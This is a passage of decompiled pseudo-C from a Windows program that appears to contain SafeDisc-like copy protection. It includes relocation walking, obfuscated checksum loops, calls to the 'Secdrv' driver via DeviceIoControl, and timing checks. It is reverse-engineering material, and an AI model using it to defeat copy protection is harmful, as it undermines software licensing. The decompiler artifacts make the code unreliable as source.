
void __cdecl
FUN_004134c0(char *param_1,uint param_2,undefined4 *param_3,uint param_4,uint param_5,
            undefined4 param_6)

{
  char *pcVar1;
  short sVar2;
  undefined4 uVar3;
  int iVar4;
  undefined4 *puVar5;
  int iVar6;
  uint uVar7;
  char *local_4;

  uVar7 = param_2;
  if (param_3 == (undefined4 *)0x0) {
    return;
  }
  iVar6 = (int)param_3 + ((uint)param_3 & 1);
  uVar3 = FUN_00413a30(param_2,iVar6 + -1 + param_2,param_4,param_5);
  pcVar1 = param_1;
  if ((short)uVar3 != 0) {
    FUN_00411930(param_1,uVar7,iVar6,3);
  }
  iVar4 = FUN_00411b00(pcVar1);
  if (iVar4 == 0) {
    FUN_0041fa30((undefined4 *)pcVar1,8,&local_4,(uint *)&param_3,(uint *)&param_1);
    puVar5 = (undefined4 *)FUN_00414db0((uint)param_3);
    if (puVar5 == (undefined4 *)0x0) {
      return;
    }
    sVar2 = FUN_00411910(pcVar1);
    if (sVar2 != 0) {
      local_4 = param_1;
    }
    FUN_00411eb0((undefined4 *)pcVar1,(int)local_4,param_3,puVar5);
    iVar4 = (int)puVar5 - (int)param_1;
    FUN_00411b20(pcVar1,puVar5);
    FUN_00411b70(pcVar1,iVar4);
    uVar7 = param_2;
    if (puVar5 == (undefined4 *)0x0) {
      return;
    }
  }
  iVar4 = FUN_00411b50(pcVar1);
  FUN_00413600(pcVar1,uVar7,iVar4,iVar6,param_4,param_5,(short)param_6);
  return;
}



/* VA 004135d0 */

void __cdecl FUN_004135d0(char *param_1)

{
  FUN_00411aa0(param_1,3);
  return;
}



/* VA 004135e0 */

void __cdecl FUN_004135e0(char *param_1,uint param_2,uint param_3)

{
  FUN_00411ad0(param_1,3,param_2,param_3);
  return;
}



/* VA 00413600 */

void __cdecl
FUN_00413600(char *param_1,int param_2,int param_3,int param_4,uint param_5,uint param_6,
            short param_7)

{
  uint *puVar1;
  uint uVar2;
  undefined4 uVar3;
  uint *puVar4;
  uint local_4;

  puVar4 = (uint *)(param_3 + param_2);
  local_4 = 0;
  puVar1 = (uint *)((int)puVar4 + param_4);
  do {
    if ((puVar1 <= puVar4) || (uVar2 = puVar4[1], uVar2 == 0)) {
      return;
    }
    uVar3 = FUN_00413a30(*puVar4,*puVar4 + 0xfff,param_5,param_6);
    if ((short)uVar3 != 0) {
      FUN_004136a0(param_1,(ushort *)(puVar4 + 2),uVar2 - 8 >> 1,*puVar4,param_5,param_6);
      local_4 = local_4 + 1;
      if ((param_7 != 0) && (1 < local_4)) {
        return;
      }
    }
    puVar4 = (uint *)((int)puVar4 + puVar4[1]);
  } while( true );
}



/* VA 004136a0 */

void __cdecl
FUN_004136a0(char *param_1,ushort *param_2,int param_3,int param_4,uint param_5,uint param_6)

{
  uint uVar1;
  undefined4 uVar2;
  ushort uVar3;

  for (; param_3 != 0; param_3 = param_3 + -1) {
    switch(*param_2 >> 0xc) {
    default:
      uVar3 = 0;
      break;
    case 1:
    case 2:
      uVar3 = 2;
      break;
    case 3:
    case 4:
    case 5:
      uVar3 = 4;
    }
    if (uVar3 != 0) {
      uVar1 = (*param_2 & 0xfff) + param_4;
      uVar2 = FUN_00413a30(uVar1,uVar1 + uVar3,param_5,param_6);
      if ((short)uVar2 != 0) {
        FUN_00411930(param_1,uVar1,(uint)uVar3,3);
      }
    }
    param_2 = param_2 + 1;
  }
  return;
}



/* VA 00413760 */

void __cdecl FUN_00413760(undefined4 param_1,undefined4 param_2,undefined4 param_3)

{
  undefined4 *puVar1;

  puVar1 = (undefined4 *)FUN_00414db0(0xc);
  if (puVar1 != (undefined4 *)0x0) {
    *puVar1 = param_1;
    puVar1[1] = param_2;
    puVar1[2] = param_3;
  }
  return;
}



/* VA 00413790 */

void __cdecl FUN_00413790(undefined *param_1)

{
  FUN_00414d40(param_1);
  return;
}



/* VA 004137a0 */

void __cdecl FUN_004137a0(uint *param_1,uint param_2,int param_3)

{
  if (param_2 < *param_1) {
    *param_1 = param_2;
  }
  param_1[1] = param_1[1] + param_3;
  return;
}



/* VA 004137c0 */

void __cdecl FUN_004137c0(uint *param_1,uint *param_2)

{
  uint uVar1;
  uint uVar2;
  uint uVar3;
  uint uVar4;

  uVar1 = *param_1;
  uVar2 = *param_2;
  uVar4 = uVar1;
  if (uVar2 <= uVar1) {
    uVar4 = uVar2;
  }
  uVar3 = uVar1 + param_1[1];
  if (uVar1 + param_1[1] < uVar2 + param_2[1]) {
    uVar3 = uVar2 + param_2[1];
  }
  *param_1 = uVar4;
  param_1[1] = uVar3 - uVar4;
  return;
}



/* VA 00413800 */

uint __cdecl FUN_00413800(uint *param_1,uint param_2,int param_3,uint param_4)

{
  uint uVar1;
  uint uVar2;

  uVar2 = *param_1;
  if ((uVar2 <= param_2) && (param_2 < param_1[1] + uVar2)) {
    uVar1 = param_3 + -1 + param_2;
    if ((uVar1 < uVar2) || (param_1[1] + uVar2 <= uVar1)) {
      if (param_1[2] == param_4) {
        param_1[1] = (param_3 + param_2) - uVar2;
        return CONCAT22((short)(uVar2 >> 0x10),1);
      }
    }
    else {
      uVar2 = param_1[2];
      if (uVar2 == param_4) {
        return CONCAT22((short)(uVar2 >> 0x10),1);
      }
    }
  }
  return uVar2 & 0xffff0000;
}



/* VA 00413860 */

uint __cdecl FUN_00413860(uint *param_1,uint param_2)

{
  uint uVar1;

  uVar1 = 0;
  if ((param_1 != (uint *)0x0) && (uVar1 = *param_1, uVar1 <= param_2)) {
    return CONCAT22((short)(uVar1 >> 0x10),1);
  }
  return uVar1 & 0xffff0000;
}



/* VA 00413880 */

bool __cdecl FUN_00413880(uint *param_1,uint param_2)

{
  return param_2 < *param_1;
}



/* VA 00413890 */

uint __cdecl FUN_00413890(uint *param_1,uint param_2)

{
  uint uVar1;

  uVar1 = 0;
  if ((param_1 != (uint *)0x0) && (uVar1 = *param_1, uVar1 == param_2)) {
    return CONCAT22((short)(uVar1 >> 0x10),1);
  }
  return uVar1 & 0xffff0000;
}



/* VA 004138b0 */

uint __cdecl FUN_004138b0(int param_1,uint param_2)

{
  uint uVar1;

  uVar1 = 0;
  if ((param_1 != 0) && (uVar1 = *(uint *)(param_1 + 8), uVar1 == param_2)) {
    return CONCAT22((short)(uVar1 >> 0x10),1);
  }
  return uVar1 & 0xffff0000;
}



/* VA 004138d0 */

int __cdecl FUN_004138d0(int *param_1)

{
  return param_1[1] + *param_1;
}



/* VA 004138e0 */

uint __cdecl FUN_004138e0(uint *param_1,uint param_2)

{
  uint uVar1;

  uVar1 = *param_1;
  if (*param_1 <= param_2) {
    uVar1 = param_2;
  }
  return uVar1;
}



/* VA 00413900 */

uint __cdecl FUN_00413900(int *param_1,uint param_2)

{
  uint uVar1;

  uVar1 = param_1[1] + -1 + *param_1;
  if (param_2 < uVar1) {
    uVar1 = param_2;
  }
  return uVar1;
}



/* VA 00413920 */

uint __cdecl FUN_00413920(int *param_1,uint param_2)

{
  uint uVar1;

  uVar1 = param_1[1] + *param_1;
  if ((uint)(param_1[1] + *param_1) <= param_2) {
    uVar1 = param_2;
  }
  return uVar1;
}



/* VA 00413940 */

uint __cdecl FUN_00413940(int *param_1,uint param_2)

{
  uint uVar1;

  uVar1 = *param_1 - 1U;
  if (param_2 < *param_1 - 1U) {
    uVar1 = param_2;
  }
  return uVar1;
}



/* VA 00413960 */

undefined4 __cdecl FUN_00413960(int *param_1,int param_2,int param_3,int param_4)

{
  undefined4 uVar1;

  uVar1 = 0;
  if (param_1[2] == param_4) {
    if ((param_2 == param_1[1] + *param_1) || (param_3 + param_2 == *param_1)) {
      uVar1 = 1;
    }
  }
  return uVar1;
}



/* VA 004139a0 */

undefined4 __cdecl FUN_004139a0(int *param_1,int *param_2)

{
  undefined4 uVar1;

  uVar1 = 0;
  if (param_1[2] == param_2[2]) {
    if ((*param_2 == param_1[1] + *param_1) || (param_2[1] + *param_2 == *param_1)) {
      uVar1 = 1;
    }
  }
  return uVar1;
}



/* VA 004139e0 */

void __cdecl FUN_004139e0(uint *param_1,uint *param_2)

{
  FUN_00413a00(param_1,*param_2,param_2[1] + *param_2);
  return;
}



/* VA 00413a00 */

undefined4 __cdecl FUN_00413a00(uint *param_1,uint param_2,uint param_3)

{
  uint uVar1;

  uVar1 = *param_1;
  if (param_2 <= uVar1) {
    if (uVar1 <= param_3) {
      return 1;
    }
    if (param_2 < uVar1) {
      return 0;
    }
  }
  if (param_2 < param_1[1] + uVar1) {
    return 1;
  }
  return 0;
}



/* VA 00413a30 */

undefined4 __cdecl FUN_00413a30(uint param_1,uint param_2,uint param_3,uint param_4)

{
  undefined4 uVar1;

  uVar1 = 0;
  if (((((param_1 <= param_3) && (param_3 <= param_2)) ||
       ((param_1 <= param_4 && (param_4 <= param_2)))) ||
      ((param_3 <= param_1 && (param_1 <= param_4)))) ||
     ((param_3 <= param_2 && (param_2 <= param_4)))) {
    uVar1 = 1;
  }
  return uVar1;
}



/* VA 00413a70 */

undefined5 __fastcall FUN_00413a70(undefined4 param_1,undefined1 param_2)

{
  char cVar1;
  undefined4 in_EAX;
  undefined3 uVar2;
  int unaff_ESI;
  int unaff_EDI;
  char in_CF;
  bool in_PF;

  uVar2 = (undefined3)((uint)in_EAX >> 8);
  if (in_PF) {
    cVar1 = ((char)in_EAX + -0x51) - in_CF;
    *(char *)(unaff_ESI + 0x66) = cVar1;
    return CONCAT14(0x82,(CONCAT31(uVar2,cVar1) ^ 0x1c) + 1);
  }
  *(undefined1 *)(unaff_EDI + -0x314fd15) = 0;
  return CONCAT14(param_2,CONCAT31(uVar2,((char)in_EAX + 'b') - in_CF));
}



/* VA 00413a9f */

uint FUN_00413a9f(void)

{
  uint uVar1;
  bool in_CF;
  bool in_ZF;
  char in_SF;
  char in_OF;
  byte *in_stack_00000010;
  undefined4 *in_stack_00000014;

  do {
    if (!in_ZF && in_OF == in_SF) break;
  } while (!in_ZF && in_OF == in_SF);
  do {
    if (!in_CF) break;
  } while (!in_CF);
  do {
    if (!in_ZF && in_OF == in_SF) break;
  } while (!in_ZF && in_OF == in_SF);
  do {
    if (!in_CF) break;
  } while (!in_CF);
  do {
    if (!in_ZF && in_OF == in_SF) break;
  } while (!in_ZF && in_OF == in_SF);
  uVar1 = FUN_00413d9a(&stack0x00000004,in_stack_00000010,in_stack_00000014,1);
  return uVar1;
}



/* VA 00413b60 */

/* WARNING: Removing unreachable block (ram,0x00413c6a) */
/* WARNING: Removing unreachable block (ram,0x00413cfc) */
/* WARNING: Removing unreachable block (ram,0x00413d5e) */
/* WARNING: Removing unreachable block (ram,0x00413c9a) */

undefined4 __cdecl FUN_00413b60(char *param_1,int *param_2,short param_3)

{
  uint uVar1;
  int *piVar2;
  bool bVar3;
  int local_20;
  int local_1c;
  undefined4 *local_18;
  int local_14;
  uint local_10;
  uint local_c;
  uint local_8;

  bVar3 = &stack0x00000000 != (undefined1 *)0x20;
  do {
    if (bVar3 && 0x1b < (int)&stack0xfffffffc) break;
  } while (bVar3 && 0x1b < (int)&stack0xfffffffc);
  local_c = local_c & 0xffff0000;
  do {
    if (bVar3 && 0x1b < (int)&stack0xfffffffc) break;
  } while (bVar3 && 0x1b < (int)&stack0xfffffffc);
  local_10 = 0;
  local_14 = 0;
  local_1c = 0;
  do {
    if (bVar3 && 0x1b < (int)&stack0xfffffffc) break;
  } while (bVar3 && 0x1b < (int)&stack0xfffffffc);
  while (local_10 = FUN_0041fa00((undefined4 *)param_1,1,local_10,&local_20,(uint *)&local_18,
                                 &local_8), local_10 != 0) {
    do {
      if (0 < (int)local_10) break;
    } while (0 < (int)local_10);
    do {
      if (0 < (int)local_10) break;
    } while (0 < (int)local_10);
    do {
      if (0 < (int)local_10) break;
    } while (0 < (int)local_10);
    uVar1 = FUN_00413f78(param_1,local_20,local_18,local_8,&local_1c,param_3);
    local_c = CONCAT22(local_c._2_2_,(short)uVar1);
    if ((uVar1 & 0xffff) == 0) {
      return uVar1 & 0xffff0000;
    }
    bVar3 = SCARRY4(local_14,local_1c);
    local_14 = local_14 + local_1c;
    do {
      if (local_14 != 0 && bVar3 == local_14 < 0) break;
    } while (local_14 != 0 && bVar3 == local_14 < 0);
    local_10 = local_10 + 0x28;
  }
  piVar2 = (int *)0x0;
  if (((local_c & 0xffff) != 0) && (param_2 != (int *)0x0)) {
    do {
      if (0 < (int)param_2) break;
    } while (0 < (int)param_2);
    *param_2 = local_14;
    piVar2 = param_2;
  }
  return CONCAT22((short)((uint)piVar2 >> 0x10),1);
}



/* VA 00413d9a */

/* WARNING: Removing unreachable block (ram,0x00413ecb) */
/* WARNING: Removing unreachable block (ram,0x00413e93) */
/* WARNING: Removing unreachable block (ram,0x00413e50) */
/* WARNING: Removing unreachable block (ram,0x00413efb) */

uint __cdecl FUN_00413d9a(char *param_1,byte *param_2,undefined4 *param_3,short param_4)

{
  undefined3 extraout_var;
  uint uVar1;
  bool bVar2;
  int local_18;
  undefined4 *local_14;
  uint local_10;
  uint local_8;

  bVar2 = &stack0x00000000 != (undefined1 *)0x18;
  local_10 = 0;
  do {
    if (bVar2 && 0x13 < (int)&stack0xfffffffc) break;
  } while (bVar2 && 0x13 < (int)&stack0xfffffffc);
  do {
    if (bVar2 && 0x13 < (int)&stack0xfffffffc) break;
  } while (bVar2 && 0x13 < (int)&stack0xfffffffc);
  do {
    local_10 = FUN_0041fa00((undefined4 *)param_1,1,local_10,&local_18,(uint *)&local_14,&local_8);
    uVar1 = 0;
    if (local_10 == 0) break;
    bVar2 = FUN_0041fd00((undefined4 *)param_1,local_10,param_2);
    uVar1 = CONCAT31(extraout_var,bVar2);
    if (uVar1 != 0) break;
    local_10 = local_10 + 0x28;
  } while( true );
  if (local_10 == 0) {
    uVar1 = uVar1 & 0xffff0000;
  }
  else {
    do {
      if (0 < (int)local_10) break;
    } while (0 < (int)local_10);
    do {
      if (0 < (int)local_10) break;
    } while (0 < (int)local_10);
    uVar1 = FUN_00413f78(param_1,local_18,local_14,local_8,param_3,param_4);
    do {
      if (&stack0x00000000 != (undefined1 *)0x24 && -0x19 < (int)&stack0xffffffc4) {
        return uVar1;
      }
    } while (&stack0x00000000 != (undefined1 *)0x24 && -0x19 < (int)&stack0xffffffc4);
  }
  return uVar1;
}



/* VA 00413f78 */

/* WARNING: Unable to track spacebase fully for stack */
/* WARNING: Removing unreachable block (ram,0x004143f1) */
/* WARNING: Removing unreachable block (ram,0x00414163) */
/* WARNING: Removing unreachable block (ram,0x00414438) */
/* WARNING: Removing unreachable block (ram,0x0041413f) */
/* WARNING: Removing unreachable block (ram,0x0041416f) */

undefined4 __cdecl
FUN_00413f78(char *param_1,int param_2,undefined4 *param_3,uint param_4,undefined4 *param_5,
            short param_6)

{
  uint uVar1;
  undefined4 uVar2;
  uint uVar3;
  int iVar4;
  undefined4 uVar5;
  undefined2 extraout_var;
  undefined1 in_CF;
  undefined1 in_ZF;
  bool bVar6;
  bool bVar7;
  char in_SF;
  bool bVar8;
  char in_OF;
  bool bVar9;
  int unaff_retaddr;
  undefined4 *local_1020;
  uint local_101c;
  uint local_1018;
  int local_1014;
  uint local_1010;
  byte local_100c [4068];
  undefined4 uStackY_28;

  FUN_004159a0();
  DAT_0042e4f8 = 0;
  do {
    if (!(bool)in_CF) break;
  } while (!(bool)in_CF);
  do {
    if (!(bool)in_ZF && in_OF == in_SF) break;
  } while (!(bool)in_ZF && in_OF == in_SF);
  do {
    if (!(bool)in_CF) break;
  } while (!(bool)in_CF);
  do {
    if (!(bool)in_ZF && in_OF == in_SF) break;
  } while (!(bool)in_ZF && in_OF == in_SF);
  do {
    if (!(bool)in_CF) break;
  } while (!(bool)in_CF);
  do {
    if (!(bool)in_ZF && in_OF == in_SF) break;
  } while (!(bool)in_ZF && in_OF == in_SF);
  do {
    if (!(bool)in_CF) break;
  } while (!(bool)in_CF);
  do {
    if (!(bool)in_ZF && in_OF == in_SF) break;
  } while (!(bool)in_ZF && in_OF == in_SF);
  do {
    if (!(bool)in_CF) break;
  } while (!(bool)in_CF);
  do {
    if (!(bool)in_ZF && in_OF == in_SF) break;
  } while (!(bool)in_ZF && in_OF == in_SF);
  do {
    if (!(bool)in_CF) break;
  } while (!(bool)in_CF);
  do {
    if (!(bool)in_ZF && in_OF == in_SF) break;
  } while (!(bool)in_ZF && in_OF == in_SF);
  do {
    if (!(bool)in_CF) break;
  } while (!(bool)in_CF);
  do {
    if (!(bool)in_ZF && in_OF == in_SF) break;
  } while (!(bool)in_ZF && in_OF == in_SF);
  do {
    if (!(bool)in_CF) break;
  } while (!(bool)in_CF);
  for (; uVar2 = DAT_0042e4f8, param_3 != (undefined4 *)0x0;
      param_3 = (undefined4 *)((int)param_3 - (int)local_1020)) {
    if (param_3 < (undefined4 *)0x1000) {
      local_1020 = param_3;
    }
    else {
      local_1020 = (undefined4 *)0x1000;
    }
    if (param_6 == 0) {
      FUN_00411eb0((undefined4 *)param_1,param_2,local_1020,(undefined4 *)local_100c);
    }
    else {
      FUN_00411eb0((undefined4 *)param_1,param_4,local_1020,(undefined4 *)local_100c);
    }
    local_1010 = param_4;
    uVar1 = (param_4 - 1) + (int)local_1020;
    do {
      if (&stack0x00000000 != (undefined1 *)0x10 && -0x11 < (int)&stack0xffffffe0) break;
    } while (&stack0x00000000 != (undefined1 *)0x10 && -0x11 < (int)&stack0xffffffe0);
LAB_00414216:
    if (local_1010 < uVar1) {
      uStackY_28 = 0x414249;
      local_101c = uVar1;
      uVar3 = FUN_004119a0(param_1,&local_1010,&local_101c,4,1);
      if ((uVar3 & 0xffff) == 0) goto LAB_004143b2;
      local_1014 = local_1010 - param_4;
      iVar4 = local_101c - local_1010;
      local_1018 = iVar4 + 1;
      bVar6 = local_1018 != 0;
      do {
        if (bVar6 && -2 < iVar4) break;
      } while (bVar6 && -2 < iVar4);
      do {
        if (bVar6 && -2 < iVar4) break;
      } while (bVar6 && -2 < iVar4);
      do {
        if (bVar6 && -2 < iVar4) break;
      } while (bVar6 && -2 < iVar4);
      FUN_0041445e(CONCAT22(extraout_var,(ushort)local_1018),local_1014,local_100c + local_1014,
                   (ushort)local_1018);
      do {
        if (&stack0x00000000 != (undefined1 *)0x10 && -9 < (int)&stack0xffffffe8) break;
      } while (&stack0x00000000 != (undefined1 *)0x10 && -9 < (int)&stack0xffffffe8);
      bVar6 = CARRY4(local_1010,local_1018);
      bVar9 = SCARRY4(local_1010,local_1018);
      local_1010 = local_1010 + local_1018;
      bVar8 = (int)local_1010 < 0;
      bVar7 = local_1010 != 0;
      do {
        if (!bVar6) break;
      } while (!bVar6);
      do {
        if (bVar7 && bVar9 == bVar8) break;
      } while (bVar7 && bVar9 == bVar8);
      do {
        if (!bVar6) break;
      } while (!bVar6);
      do {
        if (bVar7 && bVar9 == bVar8) break;
      } while (bVar7 && bVar9 == bVar8);
      goto LAB_00414216;
    }
LAB_004143b2:
    param_2 = param_2 + (int)local_1020;
    param_4 = param_4 + (int)local_1020;
  }
  uVar5 = *(undefined4 *)(&stack0xffffffec + (unaff_retaddr >> 0x1f) * -0x10);
  if (param_5 != (undefined4 *)0x0) {
    do {
      if (0 < (int)param_5) break;
    } while (0 < (int)param_5);
    *param_5 = DAT_0042e4f8;
    uVar5 = uVar2;
  }
  return CONCAT22((short)((uint)uVar5 >> 0x10),1);
}



/* VA 0041445e */

/* WARNING: Unable to track spacebase fully for stack */
/* WARNING: Removing unreachable block (ram,0x004146c8) */
/* WARNING: Removing unreachable block (ram,0x004146f8) */

undefined8 __fastcall FUN_0041445e(undefined4 param_1,int param_2,byte *param_3,ushort param_4)

{
  int iVar1;
  byte *pbVar2;
  uint uVar3;
  bool in_CF;
  bool bVar4;
  bool in_ZF;
  char in_SF;
  bool bVar5;
  char in_OF;
  bool bVar6;
  int unaff_retaddr;
  uint uStack_18;
  int local_8;

  local_8 = -0x2c8654f;
  do {
    if (!in_CF) break;
  } while (!in_CF);
  do {
    if (!in_ZF && in_OF == in_SF) break;
  } while (!in_ZF && in_OF == in_SF);
  do {
    if (!in_CF) break;
  } while (!in_CF);
  do {
    if (!in_ZF && in_OF == in_SF) break;
  } while (!in_ZF && in_OF == in_SF);
  do {
    if (!in_CF) break;
  } while (!in_CF);
  do {
    if (!in_ZF && in_OF == in_SF) break;
  } while (!in_ZF && in_OF == in_SF);
  do {
    if (!in_CF) break;
  } while (!in_CF);
  do {
    if (!in_ZF && in_OF == in_SF) break;
  } while (!in_ZF && in_OF == in_SF);
  do {
    if (!in_CF) break;
  } while (!in_CF);
  do {
    if (!in_ZF && in_OF == in_SF) break;
  } while (!in_ZF && in_OF == in_SF);
  do {
    if (!in_CF) break;
  } while (!in_CF);
  do {
    if (!in_ZF && in_OF == in_SF) break;
  } while (!in_ZF && in_OF == in_SF);
  do {
    if (!in_CF) break;
  } while (!in_CF);
  do {
    if (!in_ZF && in_OF == in_SF) break;
  } while (!in_ZF && in_OF == in_SF);
  do {
    if (!in_CF) break;
  } while (!in_CF);
  do {
    if (!in_ZF && in_OF == in_SF) break;
  } while (!in_ZF && in_OF == in_SF);
  do {
    if (!in_CF) break;
  } while (!in_CF);
  do {
    if (!in_ZF && in_OF == in_SF) break;
  } while (!in_ZF && in_OF == in_SF);
  while (param_4 != 0) {
    uVar3 = (uint)*param_3 * local_8;
    bVar4 = CARRY4(DAT_0042e4f8,uVar3);
    DAT_0042e4f8 = DAT_0042e4f8 + uVar3;
    do {
      if (!bVar4) break;
    } while (!bVar4);
    pbVar2 = param_3 + 1;
    do {
      if (pbVar2 != (byte *)0x0 && -2 < (int)param_3) break;
    } while (pbVar2 != (byte *)0x0 && -2 < (int)param_3);
    param_4 = param_4 - 1;
    param_2 = local_8 * -0x588acc6c + 0x3bc62bb2 + (uint)param_4;
    param_3 = pbVar2;
    local_8 = param_2;
  }
  uStack_18 = (uint)param_4;
  iVar1 = unaff_retaddr >> 0x1f;
  uVar3 = iVar1 * -0x10;
  bVar6 = SCARRY4((int)&uStack_18,uVar3);
  bVar5 = (int)(&uStack_18 + iVar1 * -4) < 0;
  bVar4 = &uStack_18 + iVar1 * -4 != (uint *)0x0;
  do {
    if (bVar4 && bVar6 == bVar5) break;
  } while (bVar4 && bVar6 == bVar5);
  do {
    if (!CARRY4((uint)&uStack_18,uVar3)) break;
  } while (!CARRY4((uint)&uStack_18,uVar3));
  do {
    if (bVar4 && bVar6 == bVar5) break;
  } while (bVar4 && bVar6 == bVar5);
  return CONCAT44(param_2,(&uStack_18)[iVar1 * -4]);
}



/* VA 00414760 */

/* WARNING: Removing unreachable block (ram,0x00414798) */

int __cdecl FUN_00414760(int *param_1)

{
  ushort uVar2;
  int iVar1;

  uVar2 = (ushort)((uint)param_1 >> 0x10);
  if (*param_1 == 0) {
    iVar1 = (uint)uVar2 << 0x10;
  }
  else if ((*param_1 == 1) && ((uint)param_1[1] < 3)) {
    iVar1 = (uint)uVar2 << 0x10;
  }
  else {
    iVar1 = CONCAT22(uVar2,1);
  }
  return iVar1;
}



/* VA 004147a3 */

bool FUN_004147a3(void)

{
  HANDLE hObject;

  hObject = FUN_004147cc();
  if (hObject != (HANDLE)0xffffffff) {
    CloseHandle(hObject);
  }
  return hObject != (HANDLE)0xffffffff;
}



/* VA 004147cc */

HANDLE FUN_004147cc(void)

{
  HANDLE pvVar1;
  CHAR local_108 [260];

  wsprintfA(local_108,s______s_0042abb4,s_Secdrv_0042abac);
  pvVar1 = CreateFileA(local_108,0xc0000000,3,(LPSECURITY_ATTRIBUTES)0x0,3,0x80,(HANDLE)0x0);
  return pvVar1;
}



/* VA 00414818 */

bool FUN_00414818(void)

{
  BOOL BVar1;
  bool bVar2;
  DWORD local_c;
  HANDLE local_8;

  local_8 = FUN_004147cc();
  if (local_8 == (HANDLE)0xffffffff) {
    bVar2 = false;
  }
  else {
    BVar1 = DeviceIoControl(local_8,0xef002407,DAT_0042ec30,0x514,
                            (LPVOID)((int)DAT_0042ec30 + 0x514),0x610,&local_c,(LPOVERLAPPED)0x0);
    bVar2 = BVar1 != 0;
    if (local_8 != (HANDLE)0x0) {
      CloseHandle(local_8);
    }
  }
  return bVar2;
}



/* VA 0041488c */

undefined4 FUN_0041488c(void)

{
  undefined4 *in_EAX;

  if (DAT_0042ec30 == (undefined4 *)0x0) {
    DAT_0042ec30 = (undefined4 *)FUN_00414db0(0xb24);
    if (DAT_0042ec30 == (undefined4 *)0x0) {
      return 0;
    }
    _memset(DAT_0042ec30,0,0xb24);
    *DAT_0042ec30 = 1;
    DAT_0042ec30[1] = 3;
    in_EAX = DAT_0042ec30;
    DAT_0042ec30[2] = 0;
  }
  return CONCAT22((short)((uint)in_EAX >> 0x10),1);
}



/* VA 004148f8 */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */
/* WARNING: Restarted to delay deadcode elimination for space: stack */

undefined8 __fastcall FUN_004148f8(undefined4 param_1,undefined4 param_2)

{
  return CONCAT44(param_2,_DAT_7ffe0000);
}



/* VA 00414915 */

undefined4 __fastcall
FUN_00414915(undefined4 param_1,undefined4 param_2,uint *param_3,uint *param_4)

{
  uint uVar1;
  undefined8 uVar2;
  int local_10;
  int local_c;
  undefined4 local_8;

  local_8 = 0xf367ac7f;
  uVar2 = FUN_004148f8(param_1,param_2);
  FUN_00414ac0(&local_8,&local_10);
  *param_3 = (uint)uVar2;
  for (local_c = 3; local_c != 0; local_c = local_c + -1) {
    uVar1 = FUN_00414b11(&local_10);
    param_3[local_c] = uVar1;
    *param_3 = *param_3 ^ param_3[local_c];
  }
  *param_4 = (uint)uVar2;
  return CONCAT22((short)((ulonglong)uVar2 >> 0x10),1);
}



/* VA 00414992 */

int __cdecl FUN_00414992(uint *param_1,int *param_2)

{
  ushort uVar2;
  int iVar1;
  uint uVar3;
  undefined8 uVar4;

  uVar3 = *param_1 ^ param_1[1] ^ param_1[2];
  uVar4 = FUN_004148f8(uVar3 ^ param_1[3],uVar3);
  uVar3 = (int)uVar4 - *param_2;
  uVar2 = (ushort)(uVar3 >> 0x10);
  if (uVar3 < 0xb) {
    iVar1 = CONCAT22(uVar2,1);
  }
  else {
    iVar1 = (uint)uVar2 << 0x10;
  }
  return iVar1;
}



/* VA 004149ea */

undefined4 __cdecl FUN_004149ea(undefined4 param_1,undefined4 *param_2,uint param_3,uint *param_4)

{
  int iVar1;
  undefined4 *puVar2;

  iVar1 = DAT_0042ec30;
  *(undefined4 *)(DAT_0042ec30 + 0xc) = param_1;
  FUN_00414915(iVar1 + 0x10,param_1,(uint *)(iVar1 + 0x10),param_4);
  *(uint *)(iVar1 + 0x410) = param_3;
  puVar2 = FUN_00416b40((undefined4 *)(iVar1 + 0x414),param_2,param_3);
  return CONCAT22((short)((uint)puVar2 >> 0x10),1);
}



/* VA 00414a3f */

undefined4 __cdecl FUN_00414a3f(undefined4 *param_1,uint param_2,int *param_3)

{
  int iVar1;
  uint uVar2;
  undefined4 uVar3;

  iVar1 = DAT_0042ec30;
  uVar2 = FUN_00414760((int *)(DAT_0042ec30 + 0x514));
  if ((uVar2 & 0xffff) == 0) {
    uVar3 = 0x6f;
  }
  else {
    uVar2 = FUN_00414992((uint *)(iVar1 + 0x520),param_3);
    if ((uVar2 & 0xffff) == 0) {
      uVar3 = 0x70;
    }
    else {
      FUN_00416b40(param_1,(undefined4 *)(iVar1 + 0x924),param_2);
      uVar3 = 0x6e;
    }
  }
  return uVar3;
}



/* VA 00414ac0 */

void __cdecl FUN_00414ac0(undefined4 *param_1,undefined4 *param_2)

{
  bool in_CF;
  bool in_ZF;
  char in_SF;
  char in_OF;

  do {
    if (!in_CF) break;
  } while (!in_CF);
  do {
    if (!in_ZF && in_OF == in_SF) break;
  } while (!in_ZF && in_OF == in_SF);
  *param_2 = *param_1;
  return;
}



/* VA 00414b11 */

int __cdecl FUN_00414b11(int *param_1)

{
  int iVar1;
  bool in_CF;
  bool in_ZF;
  bool bVar2;
  char in_SF;
  char in_OF;

  do {
    if (!in_CF) break;
  } while (!in_CF);
  do {
    if (!in_ZF && in_OF == in_SF) break;
  } while (!in_ZF && in_OF == in_SF);
  do {
    if (!in_CF) break;
  } while (!in_CF);
  do {
    if (!in_ZF && in_OF == in_SF) break;
  } while (!in_ZF && in_OF == in_SF);
  do {
    if (!in_CF) break;
  } while (!in_CF);
  do {
    if (!in_ZF && in_OF == in_SF) break;
  } while (!in_ZF && in_OF == in_SF);
  iVar1 = *param_1 * -0xd5acb1b;
  bVar2 = iVar1 + 0x361962e9 != 0;
  *param_1 = iVar1 + 0x361962e9;
  do {
    if (bVar2 && -0x361962ea < iVar1) break;
  } while (bVar2 && -0x361962ea < iVar1);
  do {
    if (bVar2 && -0x361962ea < iVar1) break;
  } while (bVar2 && -0x361962ea < iVar1);
  do {
    if (bVar2 && -0x361962ea < iVar1) break;
  } while (bVar2 && -0x361962ea < iVar1);
  return *param_1;
}



/* VA 00414c40 */

/* Library Function - Single Match
    _strncpy

   Libraries: Visual Studio 1998 Debug, Visual Studio 1998 Release */

char * __cdecl _strncpy(char *_Dest,char *_Source,size_t _Count)

{
  uint uVar1;
  uint uVar2;
  char cVar3;
  uint uVar4;
  uint *puVar5;

  if (_Count == 0) {
    return _Dest;
  }
  puVar5 = (uint *)_Dest;
  if (((uint)_Source & 3) != 0) {
    while( true ) {
      uVar4 = *(uint *)_Source;
      _Source = (char *)((int)_Source + 1);
      *(char *)puVar5 = (char)uVar4;
      puVar5 = (uint *)((int)puVar5 + 1);
      _Count = _Count - 1;
      if (_Count == 0) {
        return _Dest;
      }
      if ((char)uVar4 == '\0') break;
      if (((uint)_Source & 3) == 0) {
        uVar4 = _Count >> 2;
        goto joined_r0x00414c7e;
      }
    }
    do {
      if (((uint)puVar5 & 3) == 0) {
        uVar4 = _Count >> 2;
        cVar3 = '\0';
        if (uVar4 == 0) goto LAB_00414cbb;
